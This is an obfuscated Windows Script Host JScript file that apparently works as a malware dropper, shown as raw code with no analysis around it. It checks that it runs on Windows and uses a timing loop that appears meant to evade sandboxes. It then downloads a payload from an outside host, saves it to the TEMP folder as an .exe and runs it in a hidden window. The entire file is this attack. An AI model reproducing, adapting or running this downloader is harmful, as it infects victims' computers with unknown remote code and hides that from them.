var _Q0 = false;
var _GL = "CreateObject";
var _D = function _NQ() {return WScript[_GL]("WScript"+".Shell");}(), _IM = 11;
var _V = "MSXML2.XMLHTTP";
var _Q = 2123213;
var _GA = 0;
function _C(_O){_D["Run"](_O, _GA, _GA);};
function _EM(){return _V + "";};
function _ZZ(_KD, _EZ){_GA = _GA * 1; return _KD - _EZ;};
function _KB(){return _GL;};
/*@cc_on
  @if (@_win32 || @_win64)
    _Q0 = true;
  @end
@*/
if (_Q0)
{
var _ZO = "";
function _KT(){return 22;};
var _QW = 0; var _G = 0;
function _EE()
{
var _CS = new this["Date"]();
var _L = _CS["getUTCMilliseconds"]();
WScript["Sleep"](_KT());
var _CS = new this["Date"]();
var _W0 = _CS["getUTCMilliseconds"]();
WScript["Sleep"](_KT());
var _CS = new this["Date"]();
var _E = _CS["getUTCMilliseconds"]();
var _QW = "_W";
_QW = _ZZ(_W0, _L);
var _G = "_JU";
_G = _ZZ(_E, _W0);
_ZO = "open";
return _ZZ(_QW, _G);
}
var _RX = false;
var _M = false;
for (var _BY = _GA; _BY < _KT() * 1; _BY++){if (_EE() != _GA){
_RX = true; 
_G = "31" + 11 * _QW + _G; 
_M = true; 
break;
}}
function _N() {return ((_RX == true) && (_RX == _M)) ? 1 : _GA;};
if (_RX && _N() && _M){
function _GT() {return _D["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "YAlUrwka9BLjy9A6.ex" + "e";};
 _RL = _EM();
 _RR = WScript[_GL](_RL);
 var _VW = 1;
 while (_VW){
try {
	if (_VW == 1)
	{
		_RR[_ZO]("GET", "http://ihlasauracleanmax.co/j3dlad", false);
		_RR["send"]();
		_W1 = "Sleep";
	}
	WScript[_W1](_KT() + 120); 
	if (_RR["readystate"] < 2 * 2) continue;
	_VW = _GA;
	function _U(_UV) {var _T = (1, 2, 3, 4, 5, _UV); return _T;};
	_EC = WScript[_KB()]("ADODB.Stream");
	_RL = _EC;
	_RL[_ZO]();
	_RL["type"] = _U(1);
	_RL["write"](_RR["ResponseBody"]);
	_EC["position"] = _U(_GA);
	_RL["Save" + "ToFile"](_GT(), 2);
	_EC["cl"+"ose"]();
	_DL = _GT();
	_C(_DL);
} catch(_XP){};
}
}
}

